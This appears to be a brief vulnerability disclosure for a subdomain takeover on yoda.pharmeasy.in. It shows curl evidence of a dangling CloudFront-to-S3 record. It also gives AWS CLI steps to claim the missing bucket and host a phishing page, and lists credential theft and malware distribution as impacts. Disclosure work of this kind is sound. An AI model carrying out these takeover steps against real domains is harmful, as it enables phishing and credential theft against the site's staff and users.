🔓 Subdomain Takeover: yoda.pharmeasy.in

🚨 Evidence Found

$ curl -I https://yoda.pharmeasy.in
HTTP/1.1 404 Not Found
Server: CloudFront
X-Cache: Error from cloudfront
$ curl yoda.pharmeasy.in.s3.amazonaws.com
<Error><Code>NoSuchBucket</Code>
<Message>The specified bucket does not exist</Message>

💥 Vulnerability Explained

CloudFront → S3 bucket that doesn't exist → Anyone can create it

🔧 How Attack Works

# 1. Attacker creates the missing bucket:
aws s3 mb s3://yoda.pharmeasy.in

# 2. Uploads phishing page:
aws s3 cp malicious.html s3://yoda.pharmeasy.in/index.html

# 3. Result:
https://yoda.pharmeasy.in → Shows attacker's page

🎯 Impact

  • ✅ Host phishing at trusted domain
  • ✅ Steal employee credentials
  • ✅ Distribute malware
  • ✅ Damage brand reputation
